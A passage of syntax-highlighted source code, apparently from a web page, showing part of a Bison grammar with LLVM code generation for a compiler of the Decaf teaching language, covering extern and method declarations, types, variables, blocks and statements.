class="keyword">this</span>-&gt;get_block();</span><br><span class="line">        B-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_return)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;lType-&gt;isVoidTy())</span><br><span class="line">                Builder.CreateRetVoid();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Builder.CreateRet(llvm::ConstantInt::get(TheContext, llvm::APInt(<span class="number">32</span>, <span class="number">0</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        symtblt.pop_front();</span><br><span class="line">        symtblt.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// we have to create a main function </span></span><br><span class="line"><span class="function">llvm::Function *<span class="title">gen_main_def</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create the top-level definition for main</span></span><br><span class="line">    llvm::FunctionType *FT = llvm::FunctionType::get(llvm::IntegerType::get(TheContext, <span class="number">32</span>), <span class="literal">false</span>);</span><br><span class="line">    llvm::Function *TheFunction = llvm::Function::Create(FT, llvm::Function::ExternalLinkage, <span class="string">&quot;main&quot;</span>, TheModule);</span><br><span class="line">    <span class="keyword">if</span> (TheFunction == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Create a new basic block which contains a sequence of LLVM instructions</span></span><br><span class="line">    llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;entry&quot;</span>, TheFunction);</span><br><span class="line">    <span class="comment">// All subsequent calls to IRBuilder will place instructions in this location</span></span><br><span class="line">    Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">    descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    des-&gt;func = TheFunction;</span><br><span class="line">    des-&gt;kind = funcK;</span><br><span class="line">    put_symbol(<span class="string">&quot;main&quot;</span>,des);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TheFunction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while lvalues state_for state_break state_continue state_return <span class="built_in">exp</span> assign assigns assignss method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage var_declp var_declps extern_def extern_defn extern_typen extern_type func_typen func_type method_type type</span><br><span class="line"></span><br><span class="line">%right T_ASSIGN </span><br><span class="line">%left T_OR</span><br><span class="line">%left T_AND</span><br><span class="line">%left T_EQ T_NEQ T_LT T_GT T_GEQ T_LEQ</span><br><span class="line">%left T_PLUS T_MINUS </span><br><span class="line">%left T_MULT T_DIV T_MOD T_RIGHTSHIFT T_LEFTSHIFT</span><br><span class="line">%right T_NOT </span><br><span class="line">%right T_UMINUS</span><br><span class="line">%right T_LPAREN</span><br><span class="line">%left T_RPAREN</span><br><span class="line">%nonassoc T_IF</span><br><span class="line">%nonassoc T_ELSE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafEXFuncDefList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">        prog-&gt;Codegen();</span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafEXFuncDefList *slist = (decafEXFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafEXFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafEXFuncDefList *slist = <span class="keyword">new</span> decafEXFuncDefList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    </span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">string</span> Name = func-&gt;get_name();</span><br><span class="line">            llvm::SmallVector&lt;llvm::Type *,<span class="number">0</span>&gt; functionArgs;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs, <span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage,</span><br><span class="line">                Name,</span><br><span class="line">                TheModule</span><br><span class="line">            );</span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: <span class="built_in">exp</span> &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name(*$<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>);</span><br><span class="line">        type-&gt;Ty = stringTy; </span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>; </span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = voidTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    | type &#123; </span><br><span class="line">        decafType* type = (decafType* )$<span class="number">1</span>;</span><br><span class="line">        $$ = type;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = intTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;   </span><br><span class="line">    | T_BOOLTYPE &#123; </span><br><span class="line">        decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); </span><br><span class="line">        type-&gt;Ty = boolTy;</span><br><span class="line">        $$ = type;</span><br><span class="line"></span><br><span class="line">        type-&gt;lType = getLLVMType(type-&gt;Ty,Context);</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_declps method_decls T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">4</span>;</span><br><span class="line">        decafFuncDefList *method = (decafFuncDefList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafVarList(), <span class="keyword">new</span> decafFuncDefList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declps: var_declp var_declps &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declp: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_kinds(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_type(type);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalues: lvalue T_COMMA lvalues &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList*)$<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | lvalue &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ;</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ; </span><br><span class="line">        decafAllexp* arr = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        var-&gt;put_arr(arr);</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Array(&quot;</span>+arr-&gt;get_name()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafFuncDefList *slist = (decafFuncDefList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafFuncDef *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafFuncDefList *slist = <span class="keyword">new</span> decafFuncDefList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafBlock * block = (decafBlock*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type);</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">        <span class="keyword">if</span>(put_symbol( func-&gt;get_name(), des))&#123;</span><br><span class="line">            llvm::Type *returnTy = func-&gt;lType;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;llvm::Type *&gt; functionArgs;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> p:func-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">                functionArgs.push_back(p-&gt;lType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            func-&gt;lfunc = llvm::Function::Create(</span><br><span class="line">                llvm::FunctionType::get(returnTy, functionArgs ,<span class="literal">false</span>),</span><br><span class="line">                llvm::Function::ExternalLinkage, </span><br><span class="line">                func-&gt;get_name(), </span><br><span class="line">                TheModule);</span><br><span class="line">            <span class="keyword">if</span> (func-&gt;lfunc == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            des-&gt;func = func-&gt;lfunc;</span><br><span class="line">            des-&gt;kind = funcK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmts *state = (decafStmts *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafVarList *field = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        decafStmts *state = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmts *slist = (decafStmts *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafStmt *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmts *slist = <span class="keyword">new</span> decafStmts(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: T_WHILE T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafWhile *whiles = <span class="keyword">new</span> decafWhile(<span class="built_in">exp</span>,block);</span><br><span class="line">        $$ = whiles;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: T_FOR T_LPAREN assignss T_SEMICOLON <span class="built_in">exp</span> T_SEMICOLON assignss T_RPAREN blockt&#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">9</span>;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssignList *aslist2 = (decafAssignList *)$<span class="number">7</span>; </span><br><span class="line">        decafFor * fors = <span class="keyword">new</span> decafFor(<span class="built_in">exp</span>,block,aslist,aslist2);</span><br><span class="line">        $$ = fors;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: T_BREAK &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;BreakStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: T_CONTINUE &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;ContinueStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafBinexp *<span class="built_in">exp</span> = (decafBinexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN T_LPAREN T_RPAREN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assignss : assigns &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    